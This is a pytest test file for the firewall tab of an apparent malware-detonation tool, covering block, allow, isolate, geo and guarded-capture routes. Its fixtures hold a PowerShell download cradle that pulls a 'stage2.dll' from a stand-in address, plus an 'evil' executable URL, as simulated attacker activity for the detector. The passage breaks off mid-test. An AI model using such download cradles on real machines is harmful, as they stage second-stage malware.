"""FIREWALL tab back end: the fourteen routes, the readers, the decisions, the guarded fetch and the capture store.

The Windows firewall, the network and the event logs are fakes (``fw`` in conftest.py); what is tested is the
wiring: what a route refuses, what a decision does to the firewall and to the fetch, and that a fetch only
ever goes to the address that was observed.
"""

import os
import re
import threading
import time
from datetime import datetime, timezone

import pytest

import firewall
import geoip

IMAGE = r"C:\x\loader.exe"
URL = "http://203.0.113.50:8080/stage2.dll"
FINDING = {"id": "dl-abc123", "pid": 4812, "image": IMAGE, "url": URL, "dst_ip": "203.0.113.50", "dst_port": 8080,
           "source": "powershell", "observed_at": "2026-11-16T10:00:00.000Z", "origin_pid": 4812,
           "requested_by": None, "in_detonation": True, "self": False}
FIXTURE_DIR = os.path.join(os.path.dirname(__file__), "samples", "geoip")


def iso(t=0.0):
    return datetime.fromtimestamp(time.time() + t, timezone.utc).isoformat()


def conn(dst="203.0.113.50", port=8080, pid=4812, image=IMAGE, t=-5.0, host="-"):
    return {"timestamp": iso(t), "event_id": 3, "pid": str(pid), "image": image, "type": "NetworkConnect",
            "dst_ip": dst, "dst_port": str(port), "dst_hostname": host, "protocol": "tcp",
            "src_ip": "10.0.2.15", "src_port": "51000"}


def script(url=URL, pid=4812, text=None, t=-4.0):
    return {"time": iso(t), "source": "powershell", "message": text or f"(New-Object Net.WebClient).DownloadFile('{url}','a.dll')",
            "fields": {"event_id": 4104, "record_id": 1, "pid": pid}}


def seed(fw, url=URL, dst="203.0.113.50", port=8080, image=IMAGE, pid=4812, text=None):
    fw.store.add_connections([conn(dst, port, pid, image)])
    fw.store.add_powershell([script(url, pid, text)])


def open_window(monkeypatch, tdc, pid=4812):
    monkeypatch.setattr(tdc, "_firewall_open_windows", lambda now=None: {pid: "sub1"})


def sweep(tdc):
    tdc._firewall_sweep(now=time.time())


# ---- the routes of the brief -----------------------------------------------------------------


def test_connections_returns_tagged_flows(client, fw):
    fw.store.add_connections([conn()])
    r = client.get("/api/firewall/connections?max=50")
    assert r.status_code == 200
    assert isinstance(r.json["connections"], list)
    assert set(r.json["connections"][0]) >= {"image", "dst_ip", "dst_port", "tags", "geo", "state"}


def test_decide_takes_no_url(client, fw):
    r = client.post("/api/firewall/decide", json={"url": "http://evil/x.exe", "action": "block_fetch"})
    assert r.status_code == 400
    assert fw.fetches == []


def test_decide_with_an_unknown_id_touches_no_network(client, fw):
    r = client.post("/api/firewall/decide", json={"id": "nope", "action": "block_fetch"})
    assert r.status_code == 404 and fw.fetches == []


def test_decide_works_exactly_once(client, fw):
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    first = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"})
    second = client.post("/api/firewall/decide", json={"id": pid, "action": "allow"})
    assert first.status_code == 200 and second.status_code == 200
    assert second.json["action"] == "block_fetch"
    assert len(fw.fetches) == 1
    assert first.json["won"] is True and second.json["won"] is False


def test_fetch_refuses_a_different_destination(client, fw, tdc):
    fw.resolve_to = "9.9.9.9"                    # DNS would point elsewhere now
    out = tdc._fetch_capture({**FINDING, "dst_ip": "1.2.3.4"})
    assert out["error"] and fw.fetches == []


def test_fetch_stops_at_the_size_limit(client, fw, tdc):
    fw.body = b"A" * (tdc.FETCH_MAX_BYTES + 1)
    out = tdc._fetch_capture(FINDING)
    assert out["error"] == "too large" and out.get("sha256") is None
    assert not [p for _, _, files in os.walk(fw.samples) for p in files]       # nothing stays behind


def test_a_capture_is_recorded_and_never_marked_executed(client, fw, tdc):
    fw.body = b"MZ" + b"\x00" * 100
    out = tdc._fetch_capture(FINDING)
    rec = client.get("/api/firewall/captures").json["captures"][0]
    assert rec["sha256"] == out["sha256"] and rec["magic"] == "MZ"
    assert rec["executed"] is False


def test_expired_decisions_are_fetched_without_a_browser(client, fw, tdc):
    fw.pending.add(FINDING, deadline=time.time() - 1)
    tdc._firewall_sweep(now=time.time())
    assert len(fw.fetches) == 1
    assert fw.pending.open() == []


def test_ask_off_neither_blocks_nor_fetches(client, fw, tdc):
    client.post("/api/firewall/ask", json={"mode": "off"})
    fw.pending.add(FINDING, deadline=time.time() - 1)
    tdc._firewall_sweep(now=time.time())
    assert fw.fetches == [] and fw.run.calls == []


def test_isolate_refuses_when_the_firewall_is_off(client, fw):
    fw.profiles = {"Domain": False, "Private": False, "Public": False}
    r = client.post("/api/firewall/isolate", json={"on": True})
    assert r.status_code == 409 and "firewall" in r.json["error"].lower()


def test_tool_updates_refuse_in_isolated(client, fw, tdc, monkeypatch, tmp_path):
    import tool_updates
    from test_tool_updates import FakeEnv
    manager = tool_updates.UpdateManager(FakeEnv(), str(tmp_path / "s.json"), str(tmp_path / "u.log"),
                                         str(tmp_path / "scripts"), preconditions=tdc._update_preconditions,
                                         spawn=lambda work: None)
    monkeypatch.setattr(tdc, "_update_manager", manager)
    assert client.post("/api/firewall/isolate", json={"on": True}).status_code == 200
    apply = client.post("/api/updates/apply", json={"tools": "all"})
    check = client.post("/api/updates/check")
    assert apply.status_code == 409 and "isolated" in apply.json["error"].lower()
    assert check.status_code == 409 and "isolated" in check.json["error"].lower()
    assert manager.snapshot()["mode"] == "idle"
    client.post("/api/firewall/isolate", json={"on": False})
    assert client.post("/api/updates/check").status_code == 202


def test_the_daily_check_pauses_while_isolated(fw, tdc, monkeypatch):
    calls = []

    class Manager:
        def snapshot(self):
            return {"mode": "idle"}

        def start_check(self):
            calls.append("check")

    monkeypatch.setattr(tdc, "_get_update_manager", lambda: Manager())
    fw.settings.set(isolated=True)
    tdc._update_check_loop(1, sleep=lambda s: None, rounds=1)
    assert calls == []
    fw.settings.set(isolated=False)
    tdc._update_check_loop(1, sleep=lambda s: None, rounds=1)
    assert calls == ["check"]


def test_block_and_unblock_round_trip(client, fw):
    r = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4",
                                                 "port": 443, "protocol": "tcp", "image": IMAGE})
    rule_id = r.json["rule_id"]
    assert client.get("/api/firewall/rules").json["rules"][0]["rule_id"] == rule_id
    assert client.post("/api/firewall/unblock", json={"rule_id": rule_id}).status_code == 200
    assert client.get("/api/firewall/rules").json["rules"] == []


def test_every_action_is_written_to_the_access_log(client, fw):
    client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
    hits = client.get('/api/logs/search?q=path="/api/firewall/block"').json
    assert hits["count"] >= 1


def test_what_tdc_does_on_its_own_is_in_the_logs_too(client, fw, tdc, monkeypatch):
    """The block of the detector, the decision at the deadline and the fetch pass through no route."""
    monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", "0")
    seed(fw)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    assert len(fw.fetches) == 1

    def one(path):
        hits = client.get(f'/api/logs/search?q=path="{path}"').json
        assert hits["count"] == 1, path
        return hits["events"][0]["fields"]

    block = one("/internal/firewall/block")
    assert block["by"] == "detector" and block["status"] == 200 and block["verified"] is True
    assert block["image"] == IMAGE and block["dst_ip"] == "203.0.113.50" and block["url"] == URL
    assert block["rule_id"].startswith("TDC-FW-") and block["client"] == "tdc" and block["poll"] is False

    decide = one("/internal/firewall/decide")
    assert decide["by"] == "deadline" and decide["action"] == "block_fetch" and decide["status"] == 200

    fetch = one("/internal/firewall/fetch")
    assert fetch["by"] == "deadline" and fetch["outcome"] == "stored" and fetch["url"] == URL
    assert fetch["sha256"] and fetch["size"] and fetch["user_agent"] == tdc.FETCH_DEFAULT_UA
    assert fetch["dst_ip"] == "203.0.113.50" and fetch["dst_port"] == 8080
    assert client.get('/api/logs/search?q=by=deadline').json["count"] == 2


def test_a_fetch_that_stores_nothing_says_so_in_the_logs(client, fw, tdc):
    fw.body = b""
    assert tdc._fetch_capture(FINDING, "analyst")["error"] == "empty response"
    (event,) = client.get('/api/logs/search?q=path="/internal/firewall/fetch"').json["events"]
    assert event["fields"]["status"] == 500 and event["fields"]["error"] == "empty response"
    assert event["fields"]["by"] == "analyst" and event["fields"]["outcome"] == "failed"


def test_an_analysts_decision_names_the_analyst_in_the_logs(client, fw):
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    client.post("/api/firewall/decide", json={"id": pid, "action": "allow"})
    (event,) = client.get('/api/logs/search?q=path="/internal/firewall/decide"').json["events"]
    assert event["fields"]["by"] == "analyst" and event["fields"]["action"] == "allow"


@pytest.mark.parametrize("path, poll", [("/api/firewall/pending", True), ("/api/firewall/connections", True),
                                        ("/api/firewall/isolate", True),
                                        ("/api/firewall/rules", False), ("/api/firewall/captures", False)])
def test_only_the_polls_are_marked_as_polls(client, fw, tdc, path, poll):
    client.get(path)
    events = [e for e in tdc._logs.snapshot() if e["source"] == "access" and e["fields"]["path"] == path]
    assert events[0]["fields"]["poll"] is poll


@pytest.mark.parametrize("path, body", [
    ("/api/firewall/block", {"scope": "process", "image": IMAGE}),
    ("/api/firewall/ask", {"mode": "all"}),
    ("/api/firewall/isolate", {"on": True}),
    ("/api/firewall/decide", {"id": "x", "action": "allow"}),
    ("/api/firewall/unblock", {"rule_id": "TDC-FW-000000000000"}),
])
def test_the_action_routes_are_not_poll_paths(client, fw, tdc, path, body):
    client.post(path, json=body)
    event = [e for e in tdc._logs.snapshot() if e["fields"].get("path") == path][0]
    assert event["fields"]["poll"] is False


# ---- geo -------------------------------------------------------------------------------------


@pytest.fixture
def geo_loaded(tmp_path):
    geoip.build_index(FIXTURE_DIR, str(tmp_path))
    with open(os.path.join(FIXTURE_DIR, "countries.tsv"), encoding="utf-8") as src, \
            open(tmp_path / "countries.tsv", "w", encoding="utf-8") as dst:
        dst.write(src.read())
    geoip.load(str(tmp_path))
    yield
    geoip.load(str(tmp_path / "nothing"))


def test_geo_carries_country_and_asn_when_data_is_loaded(client, fw, geo_loaded):
    fw.store.add_connections([conn(dst="8.8.8.8", port=443), conn(dst="10.0.0.9", port=445, pid=5)])
    flows = {f["dst_ip"]: f for f in client.get("/api/firewall/connections").json["connections"]}
    assert flows["8.8.8.8"]["geo"]["cc"] == "US" and flows["8.8.8.8"]["geo"]["asn"] == 15169
    assert flows["8.8.8.8"]["geo"]["scope"] == "public"
    assert flows["10.0.0.9"]["geo"]["scope"] == "local" and flows["10.0.0.9"]["geo"]["cc"] is None
    assert client.get("/api/firewall/geo?ip=8.8.8.8").json["geo"]["cc"] == "US"


def test_geo_without_data_is_scope_and_nulls_and_nothing_raises(client, fw, tmp_path):
    geoip.load(str(tmp_path / "nothing"))
    assert not geoip.available()
    fw.store.add_connections([conn(dst="8.8.8.8", port=443)])
    r = client.get("/api/firewall/connections")
    assert r.status_code == 200
    assert r.json["connections"][0]["geo"] == {"scope": "public", "cc": None, "country": None, "lat": None,
                                               "lon": None, "asn": None, "as_org": None}
    assert client.get("/api/firewall/geo?ip=8.8.8.8").status_code == 200
    assert client.get("/api/firewall/summary").status_code == 200
    assert client.get("/api/firewall/geo?ip=not-an-ip").status_code == 400


def test_start_up_loads_the_geo_data_once(tdc, monkeypatch):
    loaded = []
    monkeypatch.setattr(tdc.geoip, "load", lambda *a: loaded.append(a))
    monkeypatch.setattr(tdc, "_ensure_capture_dir", lambda *a: None)
    monkeypatch.setattr(tdc.firewall_rules, "startup_state", lambda run, settings: {"announce": False})
    monkeypatch.setattr(tdc, "_firewall_loop", lambda collector: None)
    tdc._start_firewall().join(2)
    assert loaded == [()]


def test_the_geo_of_one_address_comes_from_the_table_and_sits_in_the_same_place_every_time(geo_loaded):
    out = firewall.geo_info("8.8.8.8")
    assert out["scope"] == "public" and out["cc"] == "US" and out["country"] == "United States"
    assert out["asn"] == 15169 and "GOOGLE" in out["as_org"]
    assert -90 <= out["lat"] <= 90 and -180 <= out["lon"] <= 180
    assert firewall.geo_info("8.8.8.8") == out                 # jittered, but always to the same point
    assert firewall.geo_info("8.8.8.9") != out                 # and not to the neighbour's point
    nl = firewall.geo_info("193.0.0.1")                        # a country the centroid table does not know
    assert nl["asn"] == 3333 and nl["cc"] == "NL" and nl["lat"] is None
    assert firewall.geo_info("10.0.0.9") == {"scope": "local", "cc": None, "country": None, "lat": None,
                                             "lon": None, "asn": None, "as_org": None}


def test_the_geo_of_one_address_can_be_asked_of_a_lookup_of_its_own():
    answer = geoip.GeoInfo("DE", "Germany", 51.0, 9.0, 3320, "DTAG", "public")
    out = firewall.geo_info("203.0.113.9", lambda ip: answer)
    assert out["cc"] == "DE" and out["asn"] == 3320 and out["as_org"] == "DTAG"
    assert out["lat"] != 51.0 and abs(out["lat"] - 51.0) < 3   # moved off the centroid, deterministically
    assert firewall.geo_info("203.0.113.9", lambda ip: None)["scope"] == "public"


# ---- the decide route ------------------------------------------------------------------------


@pytest.mark.parametrize("body", [
    {"id": "x", "action": "allow", "url": "http://evil/x"},
    {"id": "x", "action": "allow", "extra": 1},
    {"action": "allow"}, {"id": "x"}, {"id": 5, "action": "allow"}, {"id": "x", "action": "kill"},
    {"id": "x", "action": ["allow"]}, [], "allow",
])
def test_decide_rejects_anything_but_an_id_and_an_action(client, fw, body):
    fw.pending.add(FINDING, deadline=time.time() + 30)
    assert client.post("/api/firewall/decide", json=body).status_code == 400
    assert fw.fetches == [] and len(fw.pending.open()) == 1


def test_decide_without_json_is_a_400(client, fw):
    assert client.post("/api/firewall/decide", data="id=x", content_type="text/plain").status_code == 400


def test_block_fetch_blocks_the_loader_and_keeps_the_fetcher_free(client, fw, tdc):
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    out = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"}).json
    assert out["item"]["result"]["block"]["verified"] is True
    assert out["item"]["result"]["fetch"]["sha256"]
    (rule,) = [r for r in client.get("/api/firewall/rules").json["rules"]]
    assert rule["image"].lower() == IMAGE.lower() and rule["ip"] == "203.0.113.50" and rule["blocking"]
    assert rule["port"] is None


def test_allow_removes_the_block_when_nothing_else_holds_the_endpoint(client, fw):
    client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "203.0.113.50", "image": IMAGE})
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    out = client.post("/api/firewall/decide", json={"id": pid, "action": "allow"}).json
    assert out["item"]["result"]["unblocked"] is True
    assert client.get("/api/firewall/rules").json["rules"] == [] and fw.fetches == []


def test_two_decisions_for_one_endpoint_in_opposite_directions_keep_it_blocked_until_none_holds_it(client, fw):
    a = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    b = fw.pending.add({**FINDING, "id": "dl-b", "url": URL + "?b"}, deadline=time.time() + 30)["id"]
    first = client.post("/api/firewall/decide", json={"id": a, "action": "allow"}).json
    assert first["item"]["result"]["unblocked"] is False                    # b is still open
    client.post("/api/firewall/decide", json={"id": b, "action": "block"})
    assert len(client.get("/api/firewall/rules").json["rules"]) == 1
    c = fw.pending.add({**FINDING, "id": "dl-c", "url": URL + "?c"}, deadline=time.time() + 30)["id"]
    client.post("/api/firewall/decide", json={"id": c, "action": "allow"})
    assert len(client.get("/api/firewall/rules").json["rules"]) == 1        # b decided block: still held


def test_an_address_wide_block_refuses_block_fetch_and_keeps_the_id(client, fw):
    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    r = client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"})
    assert r.status_code == 409 and fw.fetches == []
    assert client.post("/api/firewall/decide", json={"id": pid, "action": "block"}).status_code == 200


def test_the_deadline_falls_back_to_block_only_under_an_address_wide_block(client, fw, tdc):
    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
    fw.pending.add(FINDING, deadline=time.time() - 1)
    sweep(tdc)
    assert fw.fetches == []
    assert fw.pending.history(1)[0]["action"] == "block"


def test_the_pending_route_lists_open_and_decided_with_the_time_left(client, fw):
    fw.pending.add(FINDING, deadline=time.time() + 30)
    fw.pending.add({**FINDING, "id": "dl-done"}, deadline=time.time() + 30)
    client.post("/api/firewall/decide", json={"id": "dl-done", "action": "block"})
    out = client.get("/api/firewall/pending").json
    assert [i["id"] for i in out["pending"]] == ["dl-abc123"] and 0 < out["pending"][0]["remaining"] <= 30
    assert out["pending"][0]["deadline"].endswith("Z")
    assert [i["id"] for i in out["history"]] == ["dl-done"] and out["history"][0]["result"]["by"] == "analyst"
    assert out["ask_mode"] == "detonation"


def test_an_open_decision_says_whether_tdc_can_fetch_it(client, fw, tdc, monkeypatch):
    fw.pending.add(FINDING, deadline=time.time() + 30)
    assert client.get("/api/firewall/pending").json["pending"][0]["can_fetch"] is True
    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
    assert client.get("/api/firewall/pending").json["pending"][0]["can_fetch"] is False
    monkeypatch.setattr(tdc, "_fw_rules", lambda force=False: (None, "PowerShell failed"))
    assert client.get("/api/firewall/pending").json["pending"][0]["can_fetch"] is None


def test_a_fetch_that_finishes_after_its_item_was_pruned_still_keeps_the_capture(client, fw, tdc, monkeypatch):
    fw.pending.add(FINDING, deadline=time.time() + 30)
    monkeypatch.setattr(fw.pending, "set_result", lambda *a, **k: None)
    tdc._fw_fetch_item("dl-abc123")
    assert len(client.get("/api/firewall/captures").json["captures"]) == 1


# ---- ask, isolate, block ---------------------------------------------------------------------


def test_ask_sets_the_mode_and_refuses_junk(client, fw):
    assert client.post("/api/firewall/ask", json={"mode": "all"}).json == {"ask_mode": "all"}
    assert fw.settings.ask_mode == "all"
    for body in ({"mode": "never"}, {"mode": "all", "x": 1}, {}, {"mode": ["all"]}):
        assert client.post("/api/firewall/ask", json=body).status_code == 400
    assert fw.settings.ask_mode == "all"


def test_isolate_state_and_switch(client, fw):
    state = client.get("/api/firewall/isolate").json
    assert state["isolated"] is False and state["profiles_off"] == []
    on = client.post("/api/firewall/isolate", json={"on": True})
    assert on.status_code == 200 and on.json["isolated"] is True and on.json["state"]["isolated"] is True
    assert fw.settings.isolated and fw.settings.outbound_before == "Allow"
    off = client.post("/api/firewall/isolate", json={"on": False})
    assert off.json["isolated"] is False and not fw.settings.isolated
    assert client.post("/api/firewall/isolate", json={"on": "yes"}).status_code == 400


def test_the_fetch_is_let_out_of_isolated_for_one_address_and_no_longer(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/isolate", json={"on": True})
    firewall_rules = tdc.firewall_rules
    assert not any(n.startswith(firewall_rules.FETCH_PREFIX) or n == firewall_rules.FETCHER_RULE
                   for n in fw.run.rules)                      # no standing way out for the interpreter
    names = [firewall_rules.fetch_rule_name("203.0.113.50", 8080, p) for p in tdc._fw_fetcher_paths()]
    windows, standing = fw.run, []

    def watch(args):
        out = windows(args)
        standing.append(set(windows.rules))
        return out
    monkeypatch.setattr(tdc, "_fw_runner", watch)
    out = tdc._fetch_capture(FINDING)
    assert out["sha256"] and out["allow_rules"] == names and out["allow_problem"] is None
    assert out["allow_closed"] is True and out["close_problem"] is None
    assert any(set(names) <= seen for seen in standing)        # they stood while the fetch ran
    assert not any(n in windows.rules for n in names)          # and are gone afterwards
    rule = next(c for c in windows.calls if names[0] in c and "Create" in c)
    assert "-Program" in rule and tdc._fw_fetcher_paths()[0] in rule and "Allow" in rule
    assert "203.0.113.50" in rule and "8080" in rule
    assert tdc._fw_isolate_state()["fetch_paths_open"] == []


def test_the_fetch_is_let_out_as_every_binary_a_venv_launcher_may_use(client, fw, tdc, monkeypatch):
    base = r"C:\Python312\python.exe"
    monkeypatch.setattr(tdc.sys, "_base_executable", base)
    assert tdc._fw_fetcher_paths() == (tdc.sys.executable, base)
    client.post("/api/firewall/isolate", json={"on": True})
    out = tdc._fetch_capture(FINDING)
    assert len(out["allow_rules"]) == 2 and out["allow_problem"] is None
    programs = [c[c.index("-Program") + 1] for c in fw.run.calls
                if tdc.firewall_rules.FETCH_PREFIX in " ".join(c) and "Create" in c]
    assert programs == [tdc.sys.executable, base]
    assert not any(n in fw.run.rules for n in out["allow_rules"])
    monkeypatch.setattr(tdc.sys, "_base_executable", tdc.sys.executable.upper())
    assert len(tdc._fw_fetcher_paths()) == 1                   # the same program twice is one rule


def test_without_isolated_a_fetch_writes_no_rule_at_all(client, fw, tdc):
    assert tdc._fetch_capture(FINDING)["allow_rules"] == []
    assert fw.run.calls == []


@pytest.mark.parametrize("program", ["executable", "base"])
def test_no_binary_the_fetch_may_run_as_can_be_blocked(client, fw, tdc, monkeypatch, program):
    base = r"C:\Python312\python.exe"
    monkeypatch.setattr(tdc.sys, "_base_executable", base)
    image = tdc.sys.executable if program == "executable" else base
    r = client.post("/api/firewall/block", json={"scope": "process", "image": image})
    assert r.status_code == 409 and "fetcher" in r.json["error"]


def test_two_fetches_to_one_endpoint_share_the_way_out_and_the_last_one_closes_it(client, fw, tdc):
    client.post("/api/firewall/isolate", json={"on": True})
    first, problem = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    second, again = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert first == second and problem is None and again is None
    assert all(n in fw.run.rules for n in first)
    assert tdc._fw_close_fetch_path(second) == ([], True)      # still held by the other fetch
    assert all(n in fw.run.rules for n in first)
    assert tdc._fw_close_fetch_path(first) == ([], False)
    assert not any(n in fw.run.rules for n in first)


def test_fetches_running_at_once_never_go_out_without_their_rule(client, fw, tdc, monkeypatch):
    """One of the two races a per-endpoint count can have: a second fetch passing before the rule stands."""
    import threading
    client.post("/api/firewall/isolate", json={"on": True})
    names = [tdc.firewall_rules.fetch_rule_name("203.0.113.50", 8080, p) for p in tdc._fw_fetcher_paths()]
    stood, real_allow = [], tdc.firewall_rules.allow_fetch

    def slow_allow(*args, **kwargs):
        time.sleep(0.15)                      # the window the race lives in
        return real_allow(*args, **kwargs)

    def slow_fetch(*args, **kwargs):
        stood.append(all(n in fw.run.rules for n in names))
        time.sleep(0.05)
        return {"path": str(fw.samples / "x"), "sha256": "a" * 64, "size": 2, "magic": "MZ", "status": 200,
                "redirects": 0, "content_type": "", "user_agent": tdc.FETCH_DEFAULT_UA}
    monkeypatch.setattr(tdc.firewall_rules, "allow_fetch", slow_allow)
    monkeypatch.setattr(tdc.firewall_fetch, "fetch", slow_fetch)
    threads = [threading.Thread(target=tdc._fetch_capture, args=(FINDING,)) for _ in range(4)]
    for thread in threads:
        thread.start()
        time.sleep(0.03)
    for thread in threads:
        thread.join(10)
    assert stood == [True] * 4
    assert not any(n in fw.run.rules for n in names) and tdc._fw_isolate_state()["fetch_paths_open"] == []


def test_a_fetch_that_opens_while_another_closes_keeps_its_way_out(client, fw, tdc, monkeypatch):
    """The other race: the removal of a finished fetch must not take away the rule a new one just made."""
    import threading
    client.post("/api/firewall/isolate", json={"on": True})
    names, _ = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    real_deny, inside, go = tdc.firewall_rules.deny_fetch, threading.Event(), threading.Event()

    def slow_deny(run, name):
        inside.set()
        go.wait(5)
        return real_deny(run, name)
    monkeypatch.setattr(tdc.firewall_rules, "deny_fetch", slow_deny)
    closer = threading.Thread(target=tdc._fw_close_fetch_path, args=(names,))
    closer.start()
    assert inside.wait(5)
    opened = []
    opener = threading.Thread(target=lambda: opened.append(tdc._fw_open_fetch_path("203.0.113.50", 8080)))
    opener.start()
    time.sleep(0.1)                 # the new fetch is waiting for the lock, or (without it) already through
    go.set()
    closer.join(10)
    opener.join(10)
    assert opened and opened[0][0] == names and opened[0][1] is None
    assert all(n in fw.run.rules for n in names)       # the new fetch has its way out
    assert tdc._fw_close_fetch_path(names) == ([], False) and not any(n in fw.run.rules for n in names)


def test_a_way_out_that_will_not_close_is_retried_recorded_and_shown(client, fw, tdc, monkeypatch):
    monkeypatch.setattr(tdc, "FETCH_CLOSE_PAUSE", 0)
    client.post("/api/firewall/isolate", json={"on": True})
    names = [tdc.firewall_rules.fetch_rule_name("203.0.113.50", 8080, p) for p in tdc._fw_fetcher_paths()]
    fw.run.fail["Remove"] = (1, "denied")
    out = tdc._fetch_capture(FINDING, "deadline")
    assert out["sha256"] and out["allow_closed"] is False
    assert names[0] in out["close_problem"] and "could not be closed" in out["close_problem"]
    assert all(n in fw.run.rules for n in names)               # the hole is really still open
    removes = [c for c in fw.run.calls if "Remove" in c and names[0] in c]
    assert len(removes) >= tdc.FETCH_CLOSE_ATTEMPTS            # it was retried, not given up on at once

    state = client.get("/api/firewall/isolate").json
    assert [p["rule_id"] for p in state["fetch_paths_open"]] == names
    assert all(p["problem"] and p["since"] for p in state["fetch_paths_open"])
    (event,) = client.get('/api/logs/search?q=path="/internal/firewall/allow"').json["events"]
    assert event["fields"]["outcome"] == "still open" and event["fields"]["rule_id"] == names[0]
    assert event["fields"]["status"] == 500
    capture = client.get("/api/firewall/captures").json["captures"][0]
    assert capture["allow_closed"] is False and capture["close_problem"]

    del fw.run.fail["Remove"]                                  # the next sweep gets it
    tdc._firewall_sweep(now=time.time())
    assert not any(n in fw.run.rules for n in names)
    assert client.get("/api/firewall/isolate").json["fetch_paths_open"] == []


def test_a_way_out_a_crash_left_behind_that_will_not_go_is_named_at_start_up(client, fw, tdc, tmp_path, monkeypatch):
    """After a restart the names are gone with the process, so the rule list is the only backstop - and what
    it cannot remove has to reach LOGS and the tab instead of a Python warning nobody reads."""
    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "samples"))
    monkeypatch.setattr(tdc.firewall_fetch, "own_addresses", lambda refresh=False: frozenset())
    client.post("/api/firewall/isolate", json={"on": True})
    stuck = tdc.firewall_rules.fetch_rule_name("203.0.113.50", 8080, tdc._fw_fetcher_paths()[0])
    goes = tdc.firewall_rules.fetch_rule_name("198.51.100.9", 443, tdc._fw_fetcher_paths()[0])
    for name in (stuck, goes):
        fw.run.rules[name] = fw.run.view(name, Action="Allow", Program=tdc._fw_fetcher_paths()[0])
    real = fw.run.op_Remove
    fw.run.op_Remove = lambda p: (1, "", "denied") if p["Name"] == stuck else real(p)

    tdc._fw_prepare()
    assert goes not in fw.run.rules and stuck in fw.run.rules      # the second one was still tried
    state = client.get("/api/firewall/isolate").json
    assert [p["rule_id"] for p in state["fetch_paths_open"]] == [stuck]
    assert "denied" in state["fetch_paths_open"][0]["problem"]
    (event,) = client.get('/api/logs/search?q=path="/internal/firewall/allow"').json["events"]
    assert event["fields"]["by"] == "startup" and event["fields"]["rule_id"] == stuck

    fw.run.op_Remove = real                                        # and the sweep keeps trying
    tdc._firewall_sweep(now=time.time())
    assert stuck not in fw.run.rules
    assert client.get("/api/firewall/isolate").json["fetch_paths_open"] == []


def test_a_fetch_sharing_a_rule_is_told_what_is_wrong_with_it(client, fw, tdc, monkeypatch):
    """Two fetches to one endpoint must tell the same story: a write that failed is not 'opened cleanly'."""
    client.post("/api/firewall/isolate", json={"on": True})
    monkeypatch.setattr(tdc.firewall_rules, "allow_fetch",
                        lambda *a, **kw: (_ for _ in ()).throw(tdc.firewall_rules.RuleError("no rule for you")))
    first_names, first = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    second_names, second = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert first_names == second_names
    assert first == "no rule for you" and second == first
    assert tdc._fw_close_fetch_path(second_names) == ([], True)
    assert tdc._fw_close_fetch_path(first_names) == ([], False)


def test_a_fetch_that_could_not_claim_a_rule_holds_nothing(client, fw, tdc, monkeypatch):
    """While the sweep is removing every per-fetch rule, a fetch waits; if it gives up it owns nothing, and
    says why, instead of reporting a way out it never had."""
    client.post("/api/firewall/isolate", json={"on": True})
    monkeypatch.setattr(tdc, "_fw_fetch_sweeping", True)
    monkeypatch.setattr(tdc, "FETCH_PATH_WAIT_S", 0)
    names, problem = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert names == () and "sweep" in problem and tdc._fw_fetch_paths == {}
    out = tdc._fetch_capture(FINDING)
    assert out["allow_rules"] == [] and out["allow_closed"] is None and out["allow_problem"] == problem


def test_a_fetch_that_gives_up_on_a_removal_holds_nothing_and_takes_no_later_rule_away(client, fw, tdc, monkeypatch):
    """A claim that times out while the endpoint's rules are being removed must not take a share of the entry
    the remover is about to delete: its close would later remove a new fetch's rule and leave it untracked."""
    import threading
    monkeypatch.setattr(tdc, "FETCH_CLOSE_PAUSE", 0)
    client.post("/api/firewall/isolate", json={"on": True})
    names, _ = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    real_deny, inside, go = tdc.firewall_rules.deny_fetch, threading.Event(), threading.Event()

    def slow_deny(run, name):
        inside.set()
        go.wait(5)
        return real_deny(run, name)
    monkeypatch.setattr(tdc.firewall_rules, "deny_fetch", slow_deny)
    closer = threading.Thread(target=tdc._fw_close_fetch_path, args=(names,))
    closer.start()
    assert inside.wait(5)

    monkeypatch.setattr(tdc, "FETCH_PATH_WAIT_S", 0)
    late_names, late_problem = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert late_names == () and "being removed" in late_problem
    assert tdc._fw_fetch_paths[names]["holders"] == 0               # the remover's entry was left alone
    go.set()
    closer.join(10)
    monkeypatch.setattr(tdc.firewall_rules, "deny_fetch", real_deny)

    new_names, new_problem = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert new_names == names and new_problem is None
    assert tdc._fw_close_fetch_path(late_names) == ([], False)    # the one that gave up gives nothing back
    assert all(n in fw.run.rules for n in names)                    # the new fetch still has its way out
    assert client.get("/api/firewall/isolate").json["fetches_in_flight"] == 1

    fw.run.fail["Remove"] = (1, "denied")                           # and if it will not close, it is shown
    assert tdc._fw_close_fetch_path(new_names)[0] == list(names)
    state = client.get("/api/firewall/isolate").json
    assert [p["rule_id"] for p in state["fetch_paths_open"]] == list(names)


def test_a_capture_says_nothing_was_closed_when_nothing_was_opened(client, fw, tdc):
    out = tdc._fetch_capture(FINDING)
    assert out["allow_rules"] == [] and out["allow_closed"] is None and out["close_problem"] is None


def test_a_capture_says_so_while_another_fetch_still_holds_the_rule(client, fw, tdc):
